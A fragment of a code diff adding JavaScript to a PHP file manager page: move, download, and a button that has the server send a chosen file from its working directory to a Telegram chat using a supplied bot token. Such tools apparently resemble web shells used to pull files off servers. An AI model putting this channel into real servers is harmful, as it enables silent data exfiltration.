+                if (dest) createAndSubmitForm('move_selected', { destination: dest });
+            });
+        }
+
+        let fileToDownload = '';
+        const downloadModal = document.getElementById('downloadModal');
+        function openDownloadModal(filename) { fileToDownload = filename; document.getElementById('downloadFileName').textContent = decodeURIComponent(filename); downloadModal.style.display = 'flex'; }
+        function closeDownloadModal() { downloadModal.style.display = 'none'; }
+
+        if(document.getElementById("sendTelegramBtn")){
+            document.getElementById("sendTelegramBtn").addEventListener("click", function() {
+                const token = document.getElementById("telegramToken").value;
+                const chatId = document.getElementById("telegramChatId").value;
+                if (!token || !chatId) { alert("Token and Chat ID are required."); return; }
+                const currentDir = new URLSearchParams(window.location.search).get('dir') || '<?php echo getcwd(); ?>';
+                const url = `?telegram_download=1&file=${encodeURIComponent(fileToDownload)}&token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}&dir=${encodeURIComponent(currentDir)}`;
+                fetch(url).then(res => res.json()).then(data => {
+                    if (data.ok) alert("File sent!"); else alert("Failed to send file.");
+                    closeDownloadModal();
+                }).catch(() => { alert("An error occurred."); closeDownloadModal(); });
+            });
+        }
+        
+        if(document.getElementById("downloadFileBtn")){
+            document.getElementById("downloadFileBtn").addEventListener("click", function() {
+                const currentDir = new URLSearchParams(window.location.search).get('dir') || '<?php echo getcwd(); ?>';
+                window.location.href = `?download=1&file=${encodeURIComponent(fileToDownload)}&dir=${encodeURIComponent(currentDir)}`;
+                closeDownloadModal();
+            });
+        }
     </script>
 </body>
 </html>
